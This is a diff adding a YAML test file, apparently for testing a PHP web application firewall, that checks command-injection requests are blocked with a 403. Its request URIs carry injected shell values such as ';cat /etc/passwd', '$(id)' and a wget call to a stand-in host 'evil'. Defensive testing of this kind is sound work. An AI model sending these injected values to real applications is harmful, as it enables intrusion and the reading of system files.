@@ -1,0 +1,113 @@
+---
+# Test Command injection detection
+meta:
+  author: "PHP WAF Team"
+  description: "Command injection operator tests"
+  enabled: true
+  name: "022-command-injection.yaml"
+
+tests:
+  - test_id: 1
+    test_title: "Block semicolon + ls"
+    desc: "; ls triggers rule 1024"
+    stages:
+      - input:
+          dest_addr: "bridge"
+          port: 80
+          method: "GET"
+          uri: "/index.php?cmd=valid;ls"
+          headers:
+            User-Agent: "FTW Test Client"
+            Host: "localhost"
+        output:
+          status: 403
+
+  - test_id: 2
+    test_title: "Block semicolon + cat"
+    desc: "; cat triggers rule 1024"
+    stages:
+      - input:
+          dest_addr: "bridge"
+          port: 80
+          method: "GET"
+          uri: "/index.php?file=x;cat%20/etc/passwd"
+          headers:
+            User-Agent: "FTW Test Client"
+            Host: "localhost"
+        output:
+          status: 403
+
+  - test_id: 3
+    test_title: "Block && command chaining"
+    desc: "&& whoami triggers rule 1024"
+    stages:
+      - input:
+          dest_addr: "bridge"
+          port: 80
+          method: "GET"
+          uri: "/index.php?cmd=true%26%26whoami"
+          headers:
+            User-Agent: "FTW Test Client"
+            Host: "localhost"
+        output:
+          status: 403
+
+  - test_id: 4
+    test_title: "Block || command chaining"
+    desc: "|| id triggers rule 1024"
+    stages:
+      - input:
+          dest_addr: "bridge"
+          port: 80
+          method: "GET"
+          uri: "/index.php?cmd=false||id"
+          headers:
+            User-Agent: "FTW Test Client"
+            Host: "localhost"
+        output:
+          status: 403
+
+  - test_id: 5
+    test_title: "Block $(...) command substitution"
+    desc: "$(id) triggers rule 1024"
+    stages:
+      - input:
+          dest_addr: "bridge"
+          port: 80
+          method: "GET"
+          uri: "/index.php?cmd=$(id)"
+          headers:
+            User-Agent: "FTW Test Client"
+            Host: "localhost"
+        output:
+          status: 403
+
+  - test_id: 6
+    test_title: "Block ; wget download"
+    desc: "; wget triggers rule 1024"
+    stages:
+      - input:
+          dest_addr: "bridge"
+          port: 80
+          method: "GET"
+          uri: "/index.php?cmd=x;wget%20http://evil/x"
+          headers:
+            User-Agent: "FTW Test Client"
+            Host: "localhost"
+        output:
+          status: 403
+
+  - test_id: 7
+    test_title: "Allow benign value with ampersand but no command"
+    desc: "Plain text without command operators passes"
+    stages:
+      - input:
+          dest_addr: "bridge"
+          port: 80
+          method: "GET"
+          uri: "/index.php?name=Alice%20%26%20Bob"
+          headers:
+            User-Agent: "FTW Test Client"
+            Host: "localhost"
+        output:
+          status: 200
